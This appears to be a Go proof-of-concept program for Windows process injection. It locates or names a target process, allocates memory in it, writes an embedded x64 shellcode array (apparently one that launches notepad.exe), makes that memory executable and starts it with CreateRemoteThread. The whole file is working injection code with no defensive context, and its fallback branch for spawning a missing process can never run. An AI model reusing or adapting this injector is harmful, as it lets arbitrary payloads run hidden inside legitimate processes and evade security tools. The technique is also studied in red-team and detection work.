package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"

	winsyscall "github.com/nodauf/go-windows"
	"golang.org/x/sys/windows"
)

var (
	kernel32               = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	procVirtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
)

func init() {
	// Logs will print with the line number
	log.SetFlags(log.Llongfile)
}

func VirtualAllocEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	addr, _, err := procVirtualAllocEx.Call(uintptr(hProcess), lpAddress, dwSize, uintptr(flAllocationType), uintptr(flProtect))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesWritten *uintptr) error {
	_, _, err := procWriteProcessMemory.Call(uintptr(hProcess), lpBaseAddress, lpBuffer, nSize, uintptr(unsafe.Pointer(lpNumberOfBytesWritten)))
	if err.(syscall.Errno) != 0 {
		return err
	}
	return nil
}

func VirtualProtectEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, flNewProtect uint32, lpflOldProtect *uint32) error {
	_, _, err := procVirtualProtectEx.Call(uintptr(hProcess), lpAddress, dwSize, uintptr(flNewProtect), uintptr(unsafe.Pointer(lpflOldProtect)))
	if err.(syscall.Errno) != 0 {
		return err
	}
	return nil
}

func injectShellcode(shellcode []byte, pid uint32) {
	// Open the target process with necessary permissions
	pHandle, err := windows.OpenProcess(winsyscall.PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		log.Fatal("Failed to open target process: ", err)
	}
	defer windows.CloseHandle(pHandle)

	// Allocate memory in the target process
	executableMemory, err := VirtualAllocEx(pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatal("Failed to allocate memory in target process: ", err)
	}

	// Write shellcode into allocated memory in the target process
	var writtenBytes uintptr
	err = WriteProcessMemory(pHandle, executableMemory, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &writtenBytes)
	if err != nil || writtenBytes != uintptr(len(shellcode)) {
		log.Fatal("Failed to write shellcode to target process memory: ", err)
	}

	// Change memory protection to RX (read-execute) to allow code execution
	var oldProtect uint32
	err = VirtualProtectEx(pHandle, executableMemory, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		log.Fatal("Failed to change memory protection to RX: ", err)
	}

	// Create a remote thread in the target process to execute the shellcode
	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")
	threadHandle, _, _ := createRemoteThread.Call(
		uintptr(pHandle),
		0,
		0,
		executableMemory,
		0,
		0,
	)
	if threadHandle == 0 {
		log.Fatal("Failed to create remote thread in target process")
	}
	fmt.Println("Shellcode injected successfully!")
}

// findProcessByName searches for a process by name and returns its PID if found.
func findProcessByName(processToLookFor string) (uint32, error) {
	// Create a snapshot of all processes
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("failed to create process snapshot: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	// Initialize the PROCESSENTRY32 struct
	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	// Retrieve information about the first process
	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return 0, fmt.Errorf("failed to retrieve first process: %w", err)
	}

	// Loop through all processes in the snapshot
	for {
		processName := windows.UTF16PtrToString(&procEntry.ExeFile[0])

		// Check if the process name matches
		if processName == processToLookFor {
			return procEntry.ProcessID, nil // Return PID if found
		}

		// Move to the next process in the snapshot
		err := windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				break // No more processes
			}
			return 0, fmt.Errorf("failed to retrieve next process: %w", err)
		}
	}

	// Return 0 and an error if the process was not found
	return 0, fmt.Errorf("process %s not found", processToLookFor)
}

func main() {
	var shellcode = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00,
		0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
		0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20,
		0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1,
		0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b,
		0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00,
		0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b,
		0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
		0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9,
		0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38,
		0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75,
		0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b,
		0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
		0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41,
		0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff,
		0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff,
		0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
		0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95,
		0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a,
		0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00,
		0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c, 0x77, 0x69, 0x6e,
		0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
		0x32, 0x5c, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78,
		0x65, 0x00}

	// Define process ID (PID) to inject into
	var processName string
	flag.StringVar(&processName, "process", "", "Process name to inject shellcode into")
	flag.Parse()

	if processName == "" {
		fmt.Println("Please specify a process name to inject into or spawn (e.g., -process notepad)")
		os.Exit(1)
	}

	// Ensure the process name has the .exe suffix
	if !strings.HasSuffix(processName, ".exe") {
		processName += ".exe"
	}

	// Attempt to find the process by name
	pid, err := findProcessByName(processName)
	if err != nil {
		log.Fatalf("Error finding process %s: %v", processName, err)
	}

	// Start a new process if not found
	if pid == 0 {
		fmt.Printf("Process %s not found; attempting to create it.\n", processName)
		processNameUTF16, err := windows.UTF16PtrFromString(processName)
		if err != nil {
			log.Fatalf("Failed to convert process name to UTF-16: %v", err)
		}

		var process windows.ProcessInformation
		err = windows.CreateProcess(nil, processNameUTF16, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, &windows.StartupInfo{}, &process)
		if err != nil {
			log.Fatalf("Failed to start %s: %v", processName, err)
		}

		pid = process.ProcessId
		windows.CloseHandle(process.Process)
		fmt.Printf("Started new process %s with PID %d\n", processName, pid)
	} else {
		fmt.Printf("Found process %s with PID %d\n", processName, pid)
	}

	// Inject the shellcode into the process
	injectShellcode(shellcode, uint32(pid))
}
